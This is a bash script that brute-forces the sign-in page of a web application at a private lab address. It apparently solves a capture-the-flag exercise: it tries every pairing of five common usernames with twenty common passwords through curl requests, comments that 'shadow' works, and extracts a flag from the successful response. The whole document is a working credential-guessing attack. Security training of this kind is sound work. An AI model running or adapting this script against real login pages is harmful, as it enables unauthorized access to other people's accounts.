#!/bin/bash

# Brute Force Login Script
# Target: http://192.168.64.2/index.php?page=signin

TARGET="http://192.168.64.2/index.php?page=signin"

# Common usernames
USERNAMES=(
    "admin"
    "root"
    "user"
    "administrator"
    "guest"
)

# Top 20 most common passwords
PASSWORDS=(
    "123456"
    "password"
    "12345678"
    "qwerty"
    "123456789"
    "12345"
    "1234"
    "111111"
    "1234567"
    "dragon"
    "123123"
    "baseball"
    "iloveyou"
    "trustno1"
    "1234567890"
    "sunshine"
    "master"
    "shadow"      # <-- This one works!
    "ashley"
    "bailey"
)

echo "Starting brute force attack on $TARGET"
echo "Testing ${#USERNAMES[@]} usernames with ${#PASSWORDS[@]} passwords"
echo "Total attempts: $((${#USERNAMES[@]} * ${#PASSWORDS[@]}))"
echo ""

ATTEMPT=0

for username in "${USERNAMES[@]}"; do
    for password in "${PASSWORDS[@]}"; do
        ATTEMPT=$((ATTEMPT + 1))

        # Make request
        RESPONSE=$(curl -s "${TARGET}&username=${username}&password=${password}&Login=Login")

        # Check for success
        if echo "$RESPONSE" | grep -q "The flag is"; then
            echo ""
            echo "✅ SUCCESS! Found valid credentials:"
            echo "   Username: $username"
            echo "   Password: $password"
            echo "   Attempt: $ATTEMPT"
            echo ""

            # Extract flag
            FLAG=$(echo "$RESPONSE" | sed -n 's/.*The flag is : \([a-f0-9]*\).*/\1/p')
            echo "   Flag: $FLAG"

            exit 0
        else
            echo "❌ Attempt $ATTEMPT: $username:$password - Failed"
        fi

        # Small delay to avoid overwhelming the server
        sleep 0.1
    done
done

echo ""
echo "❌ No valid credentials found"
exit 1
